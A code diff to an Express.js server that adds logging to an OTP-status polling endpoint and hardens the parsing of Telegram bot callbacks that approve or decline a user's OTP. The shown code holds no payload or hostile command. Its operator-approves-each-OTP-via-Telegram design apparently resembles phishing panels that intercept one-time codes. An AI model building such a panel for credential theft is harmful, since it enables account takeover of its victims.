@@ -286,8 +286,11 @@ app.get('/api/check-otp-status', (req, res) => {
     
     const user = users.find(u => u.id == userId);
     
+    const status = user ? user.otp_status : 'idle';
+    console.log(`[CHECK STATUS] User ${userId}: ${status}`);
+    
     res.json({
-        otp_status: user ? user.otp_status : 'idle'
+        otp_status: status
     });
 });
 
@@ -309,23 +312,37 @@ app.post('/api/reset-otp-status', (req, res) => {
 
 // Telegram Webhook (support both routes)
 app.post('/api/telegram-webhook', async (req, res) => {
-    console.log('Telegram webhook received:', JSON.stringify(req.body));
+    console.log('[WEBHOOK] Received:', JSON.stringify(req.body, null, 2));
     
     if (req.body.callback_query) {
         const callbackData = req.body.callback_query.data;
         const callbackId = req.body.callback_query.id;
         
-        console.log('Callback data:', callbackData);
+        console.log('[WEBHOOK] Callback data:', callbackData);
         
-        const [action, userIdStr] = callbackData.split('_');
-        const userId = parseInt(userIdStr);
+        // Bulletproof parsing
+        let action, userId;
         
-        console.log(`[WEBHOOK] Action: ${action}, User ID: ${userId}`);
+        if (callbackData.startsWith('approve_')) {
+            action = 'approve';
+            userId = parseInt(callbackData.split('_')[1]);
+        } else if (callbackData.startsWith('decline_')) {
+            action = 'decline';
+            userId = parseInt(callbackData.split('_')[1]);
+        } else {
+            console.error('[WEBHOOK] Invalid callback data:', callbackData);
+            return res.json({ ok: true });
+        }
         
-        const user = users.find(u => u.id == userId);
+        console.log(`[WEBHOOK] Parsed - Action: ${action}, User ID: ${userId}`);
+        
+        const user = users.find(u => u.id === userId);
         if (user) {
             user.otp_status = action;
-            console.log(`[WEBHOOK] Updated status to: ${action}`);
+            console.log(`[WEBHOOK] ✅ Updated user ${userId} status to: ${action}`);
+        } else {
+            console.warn(`[WEBHOOK] ⚠️ User ${userId} not found in memory!`);
+            console.log(`[WEBHOOK] Available users:`, users.map(u => ({ id: u.id, status: u.otp_status })));
         }
         
         // Answer callback query
